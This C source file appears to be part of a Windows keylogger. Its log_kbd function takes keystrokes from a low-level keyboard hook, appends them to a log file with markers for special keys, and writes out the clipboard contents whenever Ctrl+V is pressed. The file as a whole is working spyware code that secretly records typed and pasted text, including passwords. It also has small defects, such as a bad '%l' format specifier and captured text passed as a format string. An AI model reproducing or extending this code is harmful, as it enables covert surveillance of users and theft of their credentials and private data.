#include "util/clipboard.h"
#include "util/keyboard.h"
#include "config.h"
#include "constants.h"
#include "keylogger.h"
#include <stdio.h>

// TODO: proper comments, and in header only...?
// Logs the respective characters of the provided KBD hook.
void log_kbd(const KBDLLHOOKSTRUCT* kbd_hook) {
	if (is_ignored(kbd_hook->vkCode))
		return;

	FILE* out_file;
	errno_t err = fopen_s(&out_file, OUT_FILE, "a");

	if (err)
		return;

	LPCWSTR code_value = get_key_value(kbd_hook->vkCode);

	if (code_value != NULL) {
		fwprintf(out_file, code_value);
	} else if (is_key_down(VK_CONTROL)) {
		fwprintf(out_file, L"[CTRL + %l]", (WCHAR)kbd_hook->vkCode);

		if (kbd_hook->vkCode == VK_V)
			write_clipboard_data(out_file);
	} else {
		WCHAR key_buff[KEY_BUFFER_SIZE];

		if (kbd_to_unicode(kbd_hook, key_buff, KEY_BUFFER_SIZE) > 0)
			fwprintf_s(out_file, key_buff);
	}
}

BOOL is_ignored(DWORD vk_code) {
	switch (vk_code) {
	case VK_LCONTROL:
	case VK_RCONTROL:
	case VK_CONTROL:
		return TRUE;
	default:
		return FALSE;
	}
}

LPCWSTR get_key_value(DWORD vk_code) {
	switch (vk_code) {
	case VK_RETURN:
		return L"\n";
	case VK_ESCAPE:
		return L"[ESC]";
	case VK_BACK:
		return L"[BACKSPACE]";
	default:
		return NULL;
	}
}
